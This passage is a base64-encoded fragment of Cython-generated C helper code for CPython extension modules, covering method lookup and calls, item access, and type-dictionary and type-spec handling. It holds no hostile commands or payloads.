lidXRlICclVSciLAogICAgICAgICAgICAgICAgIHR5cGVfbmFtZSwgbmFtZSk7CiAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUodHlwZV9uYW1lKTsKICAgIHJldHVybiAwOwojZWxzZQogICAgYXR0ciA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIob2JqLCBuYW1lKTsKICAgIGdvdG8gdHJ5X3VucGFjazsKI2VuZGlmCnRyeV91bnBhY2s6CiNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgIGlmIChsaWtlbHkoYXR0cikgJiYgUHlNZXRob2RfQ2hlY2soYXR0cikgJiYgbGlrZWx5KFB5TWV0aG9kX0dFVF9TRUxGKGF0dHIpID09IG9iaikpIHsKICAgICAgICBQeU9iamVjdCAqZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oYXR0cik7CiAgICAgICAgUHlfSU5DUkVGKGZ1bmN0aW9uKTsKICAgICAgICBQeV9ERUNSRUYoYXR0cik7CiAgICAgICAgKm1ldGhvZCA9IGZ1bmN0aW9uOwogICAgICAgIHJldHVybiAxOwogICAgfQojZW5kaWYKICAgICptZXRob2QgPSBhdHRyOwogICAgcmV0dXJuIDA7Cn0KCgojaWYgIShDWVRIT05fVkVDVE9SQ0FMTCAmJiAoX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwIHx8ICghQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwKSkpCnN0YXRpYyBQeU9iamVjdCogX19QeXhfX1B5T2JqZWN0X0NhbGxNZXRob2QxKFB5T2JqZWN0KiBtZXRob2QsIFB5T2JqZWN0KiBhcmcpIHsKICAgIFB5T2JqZWN0ICpyZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKG1ldGhvZCwgYXJnKTsKICAgIFB5X0RFQ1JFRihtZXRob2QpOwogICAgcmV0dXJuIHJlc3VsdDsKfQojZW5kaWYKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMShQeU9iamVjdCogb2JqLCBQeU9iamVjdCogbWV0aG9kX25hbWUsIFB5T2JqZWN0KiBhcmcpIHsKI2lmIENZVEhPTl9WRUNUT1JDQUxMICYmIChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAgfHwgKCFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDApKQogICAgUHlPYmplY3QgKmFyZ3NbMl0gPSB7b2JqLCBhcmd9OwogICAgKHZvaWQpIF9fUHl4X1B5T2JqZWN0X0dldE1ldGhvZDsKICAgICh2b2lkKSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnOwogICAgKHZvaWQpIF9fUHl4X1B5T2JqZWN0X0NhbGwyQXJnczsKICAgIHJldHVybiBQeU9iamVjdF9WZWN0b3JjYWxsTWV0aG9kKG1ldGhvZF9uYW1lLCBhcmdzLCAyIHwgUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VULCBOVUxMKTsKI2Vsc2UKICAgIFB5T2JqZWN0ICptZXRob2QgPSBOVUxMLCAqcmVzdWx0OwogICAgaW50IGlzX21ldGhvZCA9IF9fUHl4X1B5T2JqZWN0X0dldE1ldGhvZChvYmosIG1ldGhvZF9uYW1lLCAmbWV0aG9kKTsKICAgIGlmIChsaWtlbHkoaXNfbWV0aG9kKSkgewogICAgICAgIHJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwyQXJncyhtZXRob2QsIG9iaiwgYXJnKTsKICAgICAgICBQeV9ERUNSRUYobWV0aG9kKTsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQogICAgaWYgKHVubGlrZWx5KCFtZXRob2QpKSByZXR1cm4gTlVMTDsKICAgIHJldHVybiBfX1B5eF9fUHlPYmplY3RfQ2FsbE1ldGhvZDEobWV0aG9kLCBhcmcpOwojZW5kaWYKfQoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeU9iamVjdF9BcHBlbmQoUHlPYmplY3QqIEwsIFB5T2JqZWN0KiB4KSB7CiAgICBpZiAobGlrZWx5KFB5TGlzdF9DaGVja0V4YWN0KEwpKSkgewogICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9QeUxpc3RfQXBwZW5kKEwsIHgpIDwgMCkpIHJldHVybiAtMTsKICAgIH0gZWxzZSB7CiAgICAgICAgUHlPYmplY3QqIHJldHZhbCA9IF9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QxKEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hcHBlbmQsIHgpOwogICAgICAgIGlmICh1bmxpa2VseSghcmV0dmFsKSkKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgIFB5X0RFQ1JFRihyZXR2YWwpOwogICAgfQogICAgcmV0dXJuIDA7Cn0KCgojaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlPYmplY3RfR2V0SW5kZXgoUHlPYmplY3QgKm9iaiwgUHlPYmplY3QgKmluZGV4KSB7CiAgICBQeU9iamVjdCAqcnVuZXJyID0gTlVMTDsKICAgIFB5X3NzaXplX3Qga2V5X3ZhbHVlOwogICAga2V5X3ZhbHVlID0gX19QeXhfUHlJbmRleF9Bc1NzaXplX3QoaW5kZXgpOwogICAgaWYgKGxpa2VseShrZXlfdmFsdWUgIT0gLTEgfHwgIShydW5lcnIgPSBQeUVycl9PY2N1cnJlZCgpKSkpIHsKICAgICAgICByZXR1cm4gX19QeXhfR2V0SXRlbUludF9GYXN0KG9iaiwga2V5X3ZhbHVlLCAwLCAxLCAxKTsKICAgIH0KICAgIGlmIChQeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMocnVuZXJyLCBQeUV4Y19PdmVyZmxvd0Vycm9yKSkgewogICAgICAgIF9fUHl4X1R5cGVOYW1lIGluZGV4X3R5cGVfbmFtZSA9IF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUoUHlfVFlQRShpbmRleCkpOwogICAgICAgIFB5RXJyX0NsZWFyKCk7CiAgICAgICAgUHlFcnJfRm9ybWF0KFB5RXhjX0luZGV4RXJyb3IsCiAgICAgICAgICAgICJjYW5ub3QgZml0ICciIF9fUHl4X0ZNVF9UWVBFTkFNRSAiJyBpbnRvIGFuIGluZGV4LXNpemVkIGludGVnZXIiLCBpbmRleF90eXBlX25hbWUpOwogICAgICAgIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZShpbmRleF90eXBlX25hbWUpOwogICAgfQogICAgcmV0dXJuIE5VTEw7Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeU9iamVjdF9HZXRJdGVtX1Nsb3coUHlPYmplY3QgKm9iaiwgUHlPYmplY3QgKmtleSkgewogICAgX19QeXhfVHlwZU5hbWUgb2JqX3R5cGVfbmFtZTsKICAgIGlmIChsaWtlbHkoUHlUeXBlX0NoZWNrKG9iaikpKSB7CiAgICAgICAgUHlPYmplY3QgKm1ldGggPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihvYmosIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbGFzc19nZXRpdGVtKTsKICAgICAgICBpZiAoIW1ldGgpIHsKICAgICAgICAgICAgUHlFcnJfQ2xlYXIoKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBQeU9iamVjdCAqcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhtZXRoLCBrZXkpOwogICAgICAgICAgICBQeV9ERUNSRUYobWV0aCk7CiAgICAgICAgICAgIHJldHVybiByZXN1bHQ7CiAgICAgICAgfQogICAgfQogICAgb2JqX3R5cGVfbmFtZSA9IF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUoUHlfVFlQRShvYmopKTsKICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgIiciIF9fUHl4X0ZNVF9UWVBFTkFNRSAiJyBvYmplY3QgaXMgbm90IHN1YnNjcmlwdGFibGUiLCBvYmpfdHlwZV9uYW1lKTsKICAgIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZShvYmpfdHlwZV9uYW1lKTsKICAgIHJldHVybiBOVUxMOwp9CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlPYmplY3RfR2V0SXRlbShQeU9iamVjdCAqb2JqLCBQeU9iamVjdCAqa2V5KSB7CiAgICBQeVR5cGVPYmplY3QgKnRwID0gUHlfVFlQRShvYmopOwogICAgUHlNYXBwaW5nTWV0aG9kcyAqbW0gPSB0cC0+dHBfYXNfbWFwcGluZzsKICAgIFB5U2VxdWVuY2VNZXRob2RzICpzbSA9IHRwLT50cF9hc19zZXF1ZW5jZTsKICAgIGlmIChsaWtlbHkobW0gJiYgbW0tPm1wX3N1YnNjcmlwdCkpIHsKICAgICAgICByZXR1cm4gbW0tPm1wX3N1YnNjcmlwdChvYmosIGtleSk7CiAgICB9CiAgICBpZiAobGlrZWx5KHNtICYmIHNtLT5zcV9pdGVtKSkgewogICAgICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9HZXRJbmRleChvYmosIGtleSk7CiAgICB9CiAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfR2V0SXRlbV9TbG93KG9iaiwga2V5KTsKfQojZW5kaWYKCgojaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDUyB8fCAoIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwKQojZWxzZQpzdGF0aWMgaW50IF9fUHl4X2NhbGxfdHlwZV90cmF2ZXJzZShQeU9iamVjdCAqbywgaW50IGFsd2F5c19jYWxsLCB2aXNpdHByb2MgdmlzaXQsIHZvaWQgKmFyZykgewogICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDAKICAgIGlmIChfX1B5eF9nZXRfcnVudGltZV92ZXJzaW9uKCkgPCAweDAzMDkwMDAwKSByZXR1cm4gMDsKICAgICNlbmRpZgogICAgaWYgKCFhbHdheXNfY2FsbCkgewogICAgICAgIFB5VHlwZU9iamVjdCAqYmFzZSA9IF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfYmFzZSwgUHlUeXBlT2JqZWN0Kik7CiAgICAgICAgdW5zaWduZWQgbG9uZyBmbGFncyA9IFB5VHlwZV9HZXRGbGFncyhiYXNlKTsKICAgICAgICBpZiAoZmxhZ3MgJiBQeV9UUEZMQUdTX0hFQVBUWVBFKSB7CiAgICAgICAgICAgIHJldHVybiAwOwogICAgICAgIH0KICAgIH0KICAgIFB5X1ZJU0lUKChQeU9iamVjdCopUHlfVFlQRShvKSk7CiAgICByZXR1cm4gMDsKfQojZW5kaWYKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQpzdGF0aWMgUHlfc3NpemVfdCBfX1B5eF9HZXRUeXBlRGljdE9mZnNldCh2b2lkKSB7CiAgICBQeU9iamVjdCAqdHBfZGljdG9mZnNldF9vOwogICAgUHlfc3NpemVfdCB0cF9kaWN0b2Zmc2V0OwogICAgdHBfZGljdG9mZnNldF9vID0gUHlPYmplY3RfR2V0QXR0clN0cmluZygoUHlPYmplY3QqKSgmUHlUeXBlX1R5cGUpLCAiX19kaWN0b2Zmc2V0X18iKTsKICAgIGlmICh1bmxpa2VseSghdHBfZGljdG9mZnNldF9vKSkgcmV0dXJuIC0xOwogICAgdHBfZGljdG9mZnNldCA9IFB5TG9uZ19Bc1NzaXplX3QodHBfZGljdG9mZnNldF9vKTsKICAgIFB5X0RFQ1JFRih0cF9kaWN0b2Zmc2V0X28pOwogICAgaWYgKHVubGlrZWx5KHRwX2RpY3RvZmZzZXQgPT0gMCkpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoCiAgICAgICAgICAgIFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgIid0eXBlJyBkb2Vzbid0IGhhdmUgYSBkaWN0b2Zmc2V0Iik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfSBlbHNlIGlmICh1bmxpa2VseSh0cF9kaWN0b2Zmc2V0IDwgMCkpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoCiAgICAgICAgICAgIFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgIid0eXBlJyBoYXMgYW4gdW5leHBlY3RlZCBuZWdhdGl2ZSBkaWN0b2Zmc2V0LiAiCiAgICAgICAgICAgICJQbGVhc2UgcmVwb3J0IHRoaXMgYXMgQ3l0aG9uIGJ1ZyIpOwogICAgICAgIHJldHVybiAtMTsKICAgIH0KICAgIHJldHVybiB0cF9kaWN0b2Zmc2V0Owp9CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2V0VHlwZURpY3QoUHlUeXBlT2JqZWN0ICp0cCkgewogICAgc3RhdGljIFB5X3NzaXplX3QgdHBfZGljdG9mZnNldCA9IDA7CiAgICBpZiAodW5saWtlbHkodHBfZGljdG9mZnNldCA9PSAwKSkgewogICAgICAgIHRwX2RpY3RvZmZzZXQgPSBfX1B5eF9HZXRUeXBlRGljdE9mZnNldCgpOwogICAgICAgIGlmICh1bmxpa2VseSh0cF9kaWN0b2Zmc2V0ID09IC0xICYmIFB5RXJyX09jY3VycmVkKCkpKSB7CiAgICAgICAgICAgIHRwX2RpY3RvZmZzZXQgPSAwOyAvLyB0cnkgYWdhaW4gbmV4dCB0aW1lPwogICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gKihQeU9iamVjdCoqKSgoY2hhciopdHAgKyB0cF9kaWN0b2Zmc2V0KTsKfQojZW5kaWYKCgpzdGF0aWMgaW50IF9fUHl4X19TZXRJdGVtT25UeXBlRGljdChQeVR5cGVPYmplY3QgKnRwLCBQeU9iamVjdCAqaywgUHlPYmplY3QgKnYpIHsKICAgIGludCByZXN1bHQ7CiAgICBQeU9iamVjdCAqdHBfZGljdDsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIHRwX2RpY3QgPSBfX1B5eF9HZXRUeXBlRGljdCh0cCk7CiAgICBpZiAodW5saWtlbHkoIXRwX2RpY3QpKSByZXR1cm4gLTE7CiNlbHNlCiAgICB0cF9kaWN0ID0gdHAtPnRwX2RpY3Q7CiNlbmRpZgogICAgcmVzdWx0ID0gUHlEaWN0X1NldEl0ZW0odHBfZGljdCwgaywgdik7CiAgICBpZiAobGlrZWx5KCFyZXN1bHQpKSB7CiAgICAgICAgUHlUeXBlX01vZGlmaWVkKHRwKTsKICAgICAgICBpZiAodW5saWtlbHkoUHlPYmplY3RfSGFzQXR0cih2LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2V0X25hbWUpKSkgewogICAgICAgICAgICBQeU9iamVjdCAqc2V0TmFtZVJlc3VsdCA9IFB5T2JqZWN0X0NhbGxNZXRob2RPYmpBcmdzKHYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZXRfbmFtZSwgIChQeU9iamVjdCAqKSB0cCwgaywgTlVMTCk7CiAgICAgICAgICAgIGlmICghc2V0TmFtZVJlc3VsdCkgcmV0dXJuIC0xOwogICAgICAgICAgICBQeV9ERUNSRUYoc2V0TmFtZVJlc3VsdCk7CiAgICAgICAgfQogICAgfQogICAgcmV0dXJuIHJlc3VsdDsKfQoKCnN0YXRpYyBpbnQgX19QeXhfZml4X3VwX2V4dGVuc2lvbl90eXBlX2Zyb21fc3BlYyhQeVR5cGVfU3BlYyAqc3BlYywgUHlUeXBlT2JqZWN0ICp0eXBlKSB7CiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID4gMHgwMzA5MDBCMQogICAgQ1lUSE9OX1VOVVNFRF9WQVIoc3BlYyk7CiAgICBDWVRIT05fVU5VU0VEX1ZBUih0eXBlKTsKICAgIENZVEhPTl9VTlVTRURfVkFSKF9fUHl4X19TZXRJdGVtT25UeXBlRGljdCk7CiNlbHNlCiAgICBjb25zdCBQeVR5cGVfU2xvdCAqc2xvdCA9IHNwZWMtPnNsb3RzOwogICAgaW50IGNoYW5nZWQgPSAwOwojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIHdoaWxlIChzbG90ICYmIHNsb3QtPnNsb3QgJiYgc2xvdC0+c2xvdCAhPSBQeV90cF9tZW1iZXJzKQogICAgICAgIHNsb3QrKzsKICAgIGlmIChzbG90ICYmIHNsb3QtPnNsb3QgPT0gUHlfdHBfbWVtYmVycykgewojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgogICAgICAgIGNvbnN0CiNlbmRpZiAgLy8gIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTikKICAgICAgICAgICAgUHlNZW1iZXJEZWYgKm1lbWIgPSAoUHlNZW1iZXJEZWYqKSBzbG90LT5wZnVuYzsKICAgICAgICB3aGlsZSAobWVtYiAmJiBtZW1iLT5uYW1lKSB7CiAgICAgICAgICAgIGlmIChtZW1iLT5uYW1lWzBdID09ICdfJyAmJiBtZW1iLT5uYW1lWzFdID09ICdfJykgewogICAgICAgICAgICAgICAgaWYgKHN0cmNtcChtZW1iLT5uYW1lLCAiX193ZWFrbGlzdG9mZnNldF9fIikgPT0gMCkgewogICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT50eXBlID09IFRfUFlTU0laRVQpOwogICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT5mbGFncyA9PSBSRUFET05MWSk7CiAgICAgICAgICAgICAgICAgICAgdHlwZS0+dHBfd2Vha2xpc3RvZmZzZXQgPSBtZW1iLT5vZmZzZXQ7CiAgICAgICAgICAgICAgICAgICAgY2hhbmdlZCA9IDE7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIGlmIChzdHJjbXAobWVtYi0+bmFtZSwgIl9fZGljdG9mZnNldF9fIikgPT0gMCkgewogICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT50eXBlID09IFRfUFlTU0laRVQpOwogICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT5mbGFncyA9PSBSRUFET05MWSk7CiAgICAgICAgICAgICAgICAgICAgdHlwZS0+dHBfZGljdG9mZnNldCA9IG1lbWItPm9mZnNldDsKICAgICAgICAgICAgICAgICAgICBjaGFuZ2VkID0gMTsKICAgICAgICAgICAgICAgIH0KI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgICAgICAgICAgICAgICBlbHNlIGlmIChzdHJjbXAobWVtYi0+bmFtZSwgIl9fdmVjdG9yY2FsbG9mZnNldF9fIikgPT0gMCkgewogICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT50eXBlID09IFRfUFlTU0laRVQpOwogICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT5mbGFncyA9PSBSRUFET05MWSk7CiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMGI0CiAgICAgICAgICAgICAgICAgICAgdHlwZS0+dHBfdmVjdG9yY2FsbF9vZmZzZXQgPSBtZW1iLT5vZmZzZXQ7CiNlbHNlCiAgICAgICAgICAgICAgICAgICAgdHlwZS0+dHBfcHJpbnQgPSAocHJpbnRmdW5jKSBtZW1iLT5vZmZzZXQ7CiNlbmRpZgogICAgICAgICAgICAgICAgICAgIGNoYW5nZWQgPSAxOwogICAgICAgICAgICAgICAgfQojZW5kaWYgIC8vIENZVEhPTl9NRVRIX0ZBU1RDQUxMCiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCiAgICAgICAgICAgICAgICBlbHNlIGlmIChzdHJjbXAobWVtYi0+bmFtZSwgIl9fbW9kdWxlX18iKSA9PSAwKSB7CiAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmRlc2NyOwogICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT50eXBlID09IFRfT0JKRUNUKTsKICAgICAgICAgICAgICAgICAgICBhc3NlcnQobWVtYi0+ZmxhZ3MgPT0gMCB8fCBtZW1iLT5mbGFncyA9PSBSRUFET05MWSk7CiAgICAgICAgICAgICAgICAgICAgZGVzY3IgPSBQeURlc2NyX05ld01lbWJlcih0eXBlLCBtZW1iKTsKICAgICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIWRlc2NyKSkKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgICAgICAgICAgICAgIGludCBzZXRfaXRlbV9yZXN1bHQgPSBQeURpY3RfU2V0SXRlbSh0eXBlLT50cF9kaWN0LCBQeURlc2NyX05BTUUoZGVzY3IpLCBkZXNjcik7CiAgICAgICAgICAgICAgICAgICAgUHlfREVDUkVGKGRlc2NyKTsKICAgICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoc2V0X2l0ZW1fcmVzdWx0IDwgMCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBjaGFuZ2VkID0gMTsKICAgICAgICAgICAgICAgIH0KI2VuZGlmICAvLyAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCiAgICAgICAgICAgIH0KICAgICAgICAgICAgbWVtYisrOwogICAgICAgIH0KICAgIH0KI2VuZGlmICAvLyAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQogICAgc2xvdCA9IHNwZWMtPnNsb3RzOwogICAgd2hpbGUgKHNsb3QgJiYgc2xvdC0+c2xvdCAmJiBzbG90LT5zbG90ICE9IFB5X3RwX2dldHNldCkKICAgICAgICBzbG90Kys7CiAgICBpZiAoc2xvdCAmJiBzbG90LT5zbG90ID09IFB5X3RwX2dldHNldCkgewogICAgICAgIFB5R2V0U2V0RGVmICpnZXRzZXQgPSAoUHlHZXRTZXREZWYqKSBzbG90LT5wZnVuYzsKICAgICAgICB3aGlsZSAoZ2V0c2V0ICYmIGdldHNldC0+bmFtZSkgewogICAgICAgICAgICBpZiAoZ2V0c2V0LT5uYW1lWzBdID09ICdfJyAmJiBnZXRzZXQtPm5hbWVbMV0gPT0gJ18nICYmIHN0cmNtcChnZXRzZXQtPm5hbWUsICJfX21vZHVsZV9fIikgPT0gMCkgewogICAgICAgICAgICAgICAgUHlPYmplY3QgKmRlc2NyID0gUHlEZXNjcl9OZXdHZXRTZXQodHlwZSwgZ2V0c2V0KTsKICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghZGVzY3IpKQogICAgICAgICAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICAgICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICAgICAgICAgICAgICBQeU9iamVjdCAqcHluYW1lID0gUHlVbmljb2RlX0Zyb21TdHJpbmcoZ2V0c2V0LT5uYW1lKTsKICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghcHluYW1lKSkgewogICAgICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihkZXNjcik7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaW50IHNldF9pdGVtX3Jlc3VsdCA9IF9fUHl4X1NldEl0ZW1PblR5cGVEaWN0KHR5cGUsIHB5bmFtZSwgZGVzY3IpOwogICAgICAgICAgICAgICAgUHlfREVDUkVGKHB5bmFtZSk7CiAgICAgICAgICAgICAgICAjZWxzZQogICAgICAgICAgICAgICAgQ1lUSE9OX1VOVVNFRF9WQVIoX19QeXhfX1NldEl0ZW1PblR5cGVEaWN0KTsKICAgICAgICAgICAgICAgIGludCBzZXRfaXRlbV9yZXN1bHQgPSBQeURpY3RfU2V0SXRlbSh0eXBlLT50cF9kaWN0LCBQeURlc2NyX05BTUUoZGVzY3IpLCBkZXNjcik7CiAgICAgICAgICAgICAgICAjZW5kaWYKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihkZXNjcik7CiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoc2V0X2l0ZW1fcmVzdWx0IDwgMCkpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjaGFuZ2VkID0gMTsKICAgICAgICAgICAgfQogICAgICAgICAgICArK2dldHNldDsKICAgICAgICB9CiAgICB9CiNlbmRpZiAgLy8gIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQogICAgaWYgKGNoYW5nZWQpCiAgICAgICAgUHlUeXBlX01vZGlmaWVkKHR5cGUpOwojZW5kaWYgIC8vIFBZX1ZFUlNJT05fSEVYID4gMHgwMzA5MDBCMQogICAgcmV0dXJuIDA7Cn0KCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE5vQXJnKFB5T2JqZWN0ICpmdW5jKSB7CiAgICBQeU9iamVjdCAqYXJnWzJdID0ge05VTEwsIE5VTEx9OwogICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKGZ1bmMsIGFyZyArIDEsIDAgfCBfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpOwp9CgoKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMChQeU9iamVjdCogb2JqLCBQeU9iamVjdCogbWV0aG9kX25hbWUpIHsKI2lmIENZVEhPTl9WRUNUT1JDQUxMICYmIChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAgfHwgKCFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDApKQogICAgUHlPYmplY3QgKmFyZ3NbMV0gPSB7b2JqfTsKICAgICh2b2lkKSBfX1B5eF9QeU9iamVjdF9HZXRNZXRob2Q7CiAgICAodm9pZCkgX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZzsKICAgICh2b2lkKSBfX1B5eF9QeU9iamVjdF9DYWxsTm9Bcmc7CiAgICByZXR1cm4gUHlPYmplY3RfVmVjdG9yY2FsbE1ldGhvZChtZXRob2RfbmFtZSwgYXJncywgMSB8IFBZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCwgTlVMTCk7CiNlbHNlCiAgICBQeU9iamVjdCAqbWV0aG9kID0gTlVMTCwgKnJlc3VsdCA9IE5VTEw7CiAgICBpbnQgaXNfbWV0aG9kID0gX19QeXhfUHlPYmplY3RfR2V0TWV0aG9kKG9iaiwgbWV0aG9kX25hbWUsICZtZXRob2QpOwogICAgaWYgKGxpa2VseShpc19tZXRob2QpKSB7CiAgICAgICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhtZXRob2QsIG9iaik7CiAgICAgICAgUHlfREVDUkVGKG1ldGhvZCk7CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KICAgIGlmICh1bmxpa2VseSghbWV0aG9kKSkgZ290byBiYWQ7CiAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9DYWxsTm9BcmcobWV0aG9kKTsKICAgIFB5X0RFQ1JFRihtZXRob2QpOwpiYWQ6CiAgICByZXR1cm4gcmVzdWx0OwojZW5kaWYKfQoKCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBDWVRIT05fVVNFX1RZUEVfU1BFQ1MKc3RhdGljIGludCBfX1B5eF92YWxpZGF0ZV9iYXNlc190dXBsZShjb25zdCBjaGFyICp0eXBlX25hbWUsIFB5X3NzaXplX3QgZGljdG9mZnNldCwgUHlPYmplY3QgKmJhc2VzKSB7CiAgICBQeV9zc2l6ZV90IGksIG47CiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgbiA9IFB5VHVwbGVfR0VUX1NJWkUoYmFzZXMpOwojZWxzZQogICAgbiA9IFB5VHVwbGVfU2l6ZShiYXNlcyk7CiAgICBpZiAodW5saWtlbHkobiA8IDApKSByZXR1cm4gLTE7CiNlbmRpZgogICAgZm9yIChpID0gMTsgaSA8IG47IGkrKykKICAgIHsKICAgICAgICBQeVR5cGVPYmplY3QgKmI7CiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgICAgIFB5T2JqZWN0ICpiMCA9IFB5U2VxdWVuY2VfR2V0SXRlbShiYXNlcywgaSk7CiAgICAgICAgaWYgKCFiMCkgcmV0dXJuIC0xOwojZWxpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiAgICAgICAgUHlPYmplY3QgKmIwID0gUHlUdXBsZV9HRV